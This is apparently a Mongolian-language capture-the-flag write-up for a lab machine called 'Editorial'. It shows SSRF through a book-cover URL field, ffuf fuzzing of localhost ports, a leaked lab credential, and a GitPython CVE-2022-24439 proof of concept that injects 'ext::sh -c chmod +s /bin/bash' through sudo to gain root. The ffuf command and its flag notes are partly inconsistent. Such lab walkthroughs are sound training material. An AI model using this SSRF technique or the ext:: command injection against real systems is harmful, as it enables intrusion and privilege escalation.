# Editorial - SSRF / Gitpython CVE-2022-24439

Book файл publish хийх зориулалтай байна.

[image]

Хэрэв attack machine-д python 80 порт сервер ажилуулаад **Cover URL related to your book or** хэсэгт attack ip-г бичиж өгвөл GET request ирж байгааг харж байна.

[image]

## SSRF beginning

HTTP request гаргах боломжтой үед victim талын localhost хост-д ямар ямар портууд ажиллаж байгааг мэдэж болох юм.

1. Burp-Suite хүсэлтийг Intercept хийх
2. Хүсэлтийг Copy to file хийж хадгалах
3. Онгорхой портыг олохын тулд FFUF түүл ашиглах

127.0.0.1: FUZZ болгон өөрчлөх

[image]

5000 порт found.

```bash
ffuf -u http://editorial.htb/upload-cover -request injection.sql -w <(seq 1 65535) -fs 61
    -u http://editorial.htb/upload-cover - the URL to ffuz.
    -request ssrf.request - the request to based requests off of.
    -w <( seq 0 65535) - the wordlist to try, which in this case is the output of the seq command using process substitution.
    -ac - let ffuf auto filter.
```

[image]

5000 портыг анализ хийж байна.

[image]

**Victim машины localhost 5000 порт дээр API дата байгаа бөгөөд json.api файл болгон татаж авч байна.**

[image]

Сонирхолтой directory нь **/api/latest/metadata/messages/authors** тул burp-suite ашигласан.

[image]

Энэ буцаж ирсэн датаг curl ашиглан татаж авлаа.

[image]

**Credentials**

```bash
dev: dev080217_devAPI!@
```

[image]

## Gitpython CVE-2022-24439

sudo командаар python3-ийг ашиглан clone_prod_change.py-г ажиллуулах.

[image]

clone_prod_change.py кодын доторх агуулга.

[image]

Gitpython —version 2.34.1 байсан болохоор энэ binary дээр үүссэн эмзэг байдал байх боломжтой эсэхийг шалгаж үзсэн.

[image]

Тус хувилбарт Remote Code Execution эмзэг байдал үүссэн байгааг харж байна. Хэрэглэгчээс оруулж байгаа утгыг шалгахгүйгээр оруулах үед үүсдэг.

Reference: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

[image]

**PoC**

```bash
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% +s% /bin/bash'
```

[image]

ROOT!!!

[image]
